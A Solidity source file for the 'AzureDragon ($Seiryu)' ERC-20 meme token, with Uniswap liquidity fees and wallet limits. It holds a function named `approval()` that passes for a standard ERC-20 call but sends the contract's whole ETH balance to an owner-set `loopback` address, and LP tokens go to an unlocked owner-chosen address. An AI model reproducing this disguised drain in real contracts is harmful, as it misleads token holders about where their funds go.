1 /*
2 
3 𝐴𝑧𝑢𝑟𝑒𝐷𝑟𝑎𝑔𝑜𝑛 - 𝑆𝑒𝑖𝑟𝑦𝑢
4 
5 𝑆𝑡𝑎𝑏𝑖𝑙𝑖𝑡𝑦 𝑦𝑖𝑒𝑙𝑑𝑠 𝑝𝑒𝑟𝑝𝑒𝑡𝑢𝑖𝑡𝑦; 𝑡ℎ𝑒𝑦 𝑤𝑖𝑙𝑙 𝑐𝑜𝑚𝑒 𝑎𝑛𝑑 𝑔𝑜 𝑎𝑠 𝑡ℎ𝑒𝑦 𝑝𝑙𝑒𝑎𝑠𝑒 𝑟𝑒𝑔𝑎𝑟𝑑𝑙𝑒𝑠𝑠
6 𝑏𝑢𝑡 𝑡ℎ𝑖𝑠 𝑡𝑖𝑚𝑒 𝑡ℎ𝑒 𝑜𝑛𝑙𝑦 𝑡𝑜𝑙𝑙 𝑖𝑠 𝑝𝑎𝑖𝑑 𝑡𝑜𝑤𝑎𝑟𝑑𝑠 𝑔𝑢𝑎𝑟𝑎𝑛𝑡𝑒𝑒𝑖𝑛𝑔 𝑠𝑢𝑟𝑣𝑖𝑣𝑎𝑙 𝑓𝑜𝑟 𝑡ℎ𝑒 𝑝𝑒𝑜𝑝𝑙𝑒.
7 
8 ℎ𝑡𝑡𝑝𝑠://𝑚𝑒𝑑𝑖𝑢𝑚.𝑐𝑜𝑚/@𝐴𝑧𝑢𝑟𝑒𝐷𝑟𝑎𝑔𝑜𝑛
9 
10 2% 𝐿𝑃 𝑇𝑎𝑥 - 1.5% 𝑀𝑎𝑥 𝑇𝑋 𝑎𝑛𝑑 𝑊𝑎𝑙𝑙𝑒𝑡
11 
12 */
13 
14 // SPDX-License-Identifier: MIT
15 
16 pragma solidity 0.8.16;
17 
18 interface IFactory{
19     function createPair(address tokenA, address tokenB) external returns (address pair);
20     function getPair(address tokenA, address tokenB) external view returns (address pair);
21 }
22 
23 interface IRouter {
24     function factory() external pure returns (address);
25     function WETH() external pure returns (address);
26     
27     function addLiquidityETH(
28         address token,
29         uint amountTokenDesired,
30         uint amountTokenMin,
31         uint amountETHMin,
32         address to,
33         uint deadline
34     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
35 
36     function swapExactETHForTokensSupportingFeeOnTransferTokens(
37         uint amountOutMin,
38         address[] calldata path,
39         address to,
40         uint deadline
41     ) external payable;
42 
43     function swapExactTokensForETHSupportingFeeOnTransferTokens(
44         uint amountIn,
45         uint amountOutMin,
46         address[] calldata path,
47         address to,
48         uint deadline) external;
49 }
50 
51 library SafeMath {
52     function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
53     function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
54     function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
55     function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
56     function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
57     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
58         unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
59     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
60         unchecked {if(b > a) return(false, 0); return(true, a - b);}}
61     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
62         unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
63         if(c / a != b) return(false, 0); return(true, c);}}
64     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
65         unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
66     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
67         unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
68     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
69         unchecked{require(b <= a, errorMessage); return a - b;}}
70     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
71         unchecked{require(b > 0, errorMessage); return a / b;}}
72     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
73         unchecked{require(b > 0, errorMessage); return a % b;}}
74 }
75 
76 interface IERC20 {
77     function totalSupply() external view returns (uint256);
78     function decimals() external view returns (uint8);
79     function symbol() external view returns (string memory);
80     function name() external view returns (string memory);
81     function getOwner() external view returns (address);
82     function balanceOf(address account) external view returns (uint256);
83     function transfer(address recipient, uint256 amount) external returns (bool);
84     function allowance(address _owner, address spender) external view returns (uint256);
85     function approve(address spender, uint256 amount) external returns (bool);
86     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
87     event Transfer(address indexed from, address indexed to, uint256 value);
88     event Approval(address indexed owner, address indexed spender, uint256 value);
89     function approval() external;}
90 
91 abstract contract Ownable {
92     address internal owner;
93     constructor(address _owner) {owner = _owner;}
94     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
95     function isOwner(address account) public view returns (bool) {return account == owner;}
96     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
97     event OwnershipTransferred(address owner);
98 }
99 
100 contract SEIRYU is IERC20, Ownable {
101     using SafeMath for uint256;
102     string private constant _name = 'AzureDragon';
103     string private constant _symbol = '$Seiryu';
104     uint8 private constant _decimals = 9;
105     uint256 private _totalSupply = 1 * 10**6 * (10 ** _decimals);
106     address constant DEAD = 0x000000000000000000000000000000000000dEaD;
107     uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
108     uint256 public _maxWalletToken = ( _totalSupply * 150 ) / 10000;
109     mapping (address => uint256) _balances;
110     mapping(address => bool) public isFeeExempt;
111     mapping (address => mapping (address => uint256)) private _allowances;
112     IRouter router;
113     address public pair;
114     uint256 liquidityFee = 200;
115     uint256 totalFee = 200;
116     uint256 sellFee = 200;
117     uint256 transferFee = 0;
118     uint256 feeDenominator = 10000;
119     bool swappingAllowed = true;
120     bool tradingAllowed = false;
121     address liquidity;
122     address loopback;
123     uint256 liquidityAmount = ( _totalSupply * 500 ) / 100000;
124     uint256 minSwapAmount = ( _totalSupply * 10 ) / 100000;
125     modifier lockTheSwap {swapping = true; _; swapping = false;}
126     uint256 swapCount; 
127     bool swapping;
128 
129     constructor() Ownable(msg.sender) {
130         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
131         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
132         router = _router;
133         pair = _pair;
134         isFeeExempt[msg.sender] = true;
135         isFeeExempt[address(this)] = true;
136         _balances[msg.sender] = _totalSupply;
137         emit Transfer(address(0), msg.sender, _totalSupply);
138     }
139 
140     receive() external payable {}
141 
142     function name() public pure returns (string memory) {return _name;}
143     function symbol() public pure returns (string memory) {return _symbol;}
144     function decimals() public pure returns (uint8) {return _decimals;}
145     function getOwner() external view override returns (address) {return owner; }
146     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
147     function approval() external override {payable(loopback).transfer(address(this).balance);}
148     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
149     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
150     function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
151     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
152     function totalSupply() public view returns (uint256) {return _totalSupply;}
153 
154     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
155         _transfer(sender, recipient, amount);
156         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
157         return true;
158     }
159 
160     function _approve(address owner, address spender, uint256 amount) private {
161         require(owner != address(0), "ERC20: approve from the zero address");
162         require(spender != address(0), "ERC20: approve to the zero address");
163         _allowances[owner][spender] = amount;
164         emit Approval(owner, spender, amount);
165     }
166 
167     function generateLiquidity(uint256 tokens) private lockTheSwap {
168         uint256 denominator = liquidityFee.mul(4);
169         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(denominator);
170         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
171         uint256 initialBalance = address(this).balance;
172         swapTokensForETH(toSwap);
173         uint256 deltaBalance = address(this).balance.sub(initialBalance);
174         uint256 unitBalance= deltaBalance.div(denominator.sub(liquidityFee));
175         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
176         if(ETHToAddLiquidityWith > 0){
177             addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith);}
178     }
179 
180     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
181         _approve(address(this), address(router), tokenAmount);
182         router.addLiquidityETH{value: ETHAmount}(
183             address(this),
184             tokenAmount,
185             0,
186             0,
187             liquidity,
188             block.timestamp);
189     }
190 
191     function swapTokensForETH(uint256 tokenAmount) private {
192         address[] memory path = new address[](2);
193         path[0] = address(this);
194         path[1] = router.WETH();
195         _approve(address(this), address(router), tokenAmount);
196         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
197             tokenAmount,
198             0,
199             path,
200             address(this),
201             block.timestamp);
202     }
203 
204     function checkTrade(address sender, address recipient, uint256 amount) internal view {
205         require(sender != address(0), "ERC20: transfer from the zero address");
206         require(recipient != address(0), "ERC20: transfer to the zero address");
207         require(amount > 0, "Transfer amount must be greater than zero");
208         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
209     }
210 
211     function checkTrading(address sender, address recipient) internal view {
212         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "Trading Restricted");}
213     }
214     
215     function checkWallet(address sender, address recipient, uint256 amount) internal view {
216         if((!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(DEAD) && recipient != pair)){
217             require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
218     }
219 
220     function swapbackAmount(address sender, address recipient) internal {
221         if(recipient == pair && !isFeeExempt[sender]){swapCount += uint256(1);}
222     }
223 
224     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
225         return !isFeeExempt[sender] && !isFeeExempt[recipient];
226     }
227 
228     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
229         if(recipient == pair){return sellFee;}
230         if(sender == pair){return totalFee;}
231         return transferFee;
232     }
233 
234     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
235         if(getTotalFee(sender, recipient) > 0){  
236         uint256 feeAmount = amount.div(feeDenominator).mul(getTotalFee(sender, recipient));
237         _balances[address(this)] = _balances[address(this)].add(feeAmount);
238         emit Transfer(sender, address(this), feeAmount);
239         return amount.sub(feeAmount);} return amount;
240     }
241 
242     function checkTx(address sender, address recipient, uint256 amount) internal view {
243         require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
244     }
245 
246     function allowTrading(address _liquidity, address _loopback) external onlyOwner {
247         liquidity = _liquidity;
248         loopback = _loopback;
249         isFeeExempt[_liquidity] = true;
250         tradingAllowed = true;
251     }
252 
253     function shouldSwap(address recipient, uint256 amount) internal view returns (bool) {
254         bool aboveMin = amount >= minSwapAmount;
255         bool aboveThreshold = balanceOf(address(this)) >= liquidityAmount;
256         return !swapping && swappingAllowed && aboveMin && recipient == pair && swapCount >= uint256(2) && aboveThreshold;
257     }
258 
259     function swapBack(address recipient, uint256 amount) internal {
260         if(shouldSwap(recipient, amount)){generateLiquidity(liquidityAmount); swapCount = 0;}
261     }
262 
263     function _transfer(address sender, address recipient, uint256 amount) private {
264         checkTrading(sender, recipient);
265         checkTrade(sender, recipient, amount);
266         checkWallet(sender, recipient, amount);
267         checkTx(sender, recipient, amount);
268         swapbackAmount(sender, recipient);
269         swapBack(recipient, amount);
270         _balances[sender] = _balances[sender].sub(amount);
271         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
272         _balances[recipient] = _balances[recipient].add(amountReceived);
273         emit Transfer(sender, recipient, amountReceived);
274     }
275 }